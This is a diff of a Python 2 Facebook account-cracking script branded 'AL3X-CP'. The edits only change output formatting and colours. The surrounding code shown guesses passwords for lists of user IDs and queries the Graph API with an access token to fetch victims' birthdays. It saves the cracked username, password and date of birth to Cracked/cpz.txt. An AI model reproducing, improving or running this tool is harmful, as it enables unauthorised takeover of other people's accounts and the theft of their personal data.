@@ -225,7 +225,7 @@ def results(ok, cp):
         zks('  \033[1;97mTotal Cracked FB Idz: \x1b[0;92m' + str(len(ok)) + '\x1b[0;97m/' + str(len(cp)))
         zks('  \033[1;97mTotal Cracked OK Idz: \x1b[0;92m' + str(len(ok)))
         zks('  \033[1;97mTotal Cracked CP Idz: \x1b[0;97m' + str(len(cp)))
-        print '\033[1;97mCracked Idz Has Been Saved In Cracked Folder  '
+        print'\033[1;97mCracked Idz Has Been Saved In Cracked Folder  '
         print '\033[1;97m--------------------------------------------'
         raw_input('\033[1;97m[\033[1;92m*\033[1;97m] Press Any Key To Go Back To Cracking Menu: ')
         cracking_menu()
@@ -665,7 +665,7 @@ class crackmenu:
     def api(self, user, zkth):
         global loop
         (
-         sys.stdout.write('\r[\xe2\x9e\xa5] Cracking: %s/%s \xe2\x9e\xa4 OK:%s \xe2\x9e\xa4 CP:%s ' % (loop, len(self.id), len(ok), len(cp))),)
+         sys.stdout.write('\r[\xe2\x9e\xa5] Cracking: %s/%s \xe2\x9e\xa4 OK:%s \xe2\x9e\xa4 CP:%s \n' % (loop, len(self.id), len(ok), len(cp))),)
         sys.stdout.flush()
         for pw in zkth:
             pw = pw.lower()
@@ -691,7 +691,7 @@ class crackmenu:
                     ak = requests.get('https://graph.facebook.com/%s?access_token=%s' % (user, loginz))
                     az = json.loads(ak.text)
                     dob = az['birthday'].replace('/', '-')
-                    print("\n%s[AL3X-CP] \033[1;31m%s \xe2\x9e\xa4 %s \xe2\x9e\xa4 %s  %s" % (K, user, pw, dob, N))
+                    print("\n%s\x1b[1;97m[\x1b[1;91mAL3X-CP\x1b[1;97m]\033[1;30m%s \xe2\x9e\xa4 %s \xe2\x9e\xa4 %s  %s" % (K, user, pw, dob, N))
                     wrt = '%s | %s | %s' % (user, pw, dob)
                     cp.append(wrt)
                     open('Cracked/cpz.txt', 'a').write('%s\n' % wrt)
@@ -700,7 +700,7 @@ class crackmenu:
                     dob = ''
                 except:
                     pass
-                print("\n%s[AL3X-CP]\033[1;31m %s \xe2\x9e\xa4 %s  %s" % (K, user, pw, N))
+                print("\n%s\x1b[1;97m[\x1b[1;91mAL3X-CP\x1b[1;97m]\033[1;30m %s \xe2\x9e\xa4 %s  %s" % (K, user, pw, N))
                 wrt = '%s | %s ' % (user, pw)
                 cp.append(wrt)
                 open('Cracked/cpz.txt', 'a').write('%s\n' % wrt)
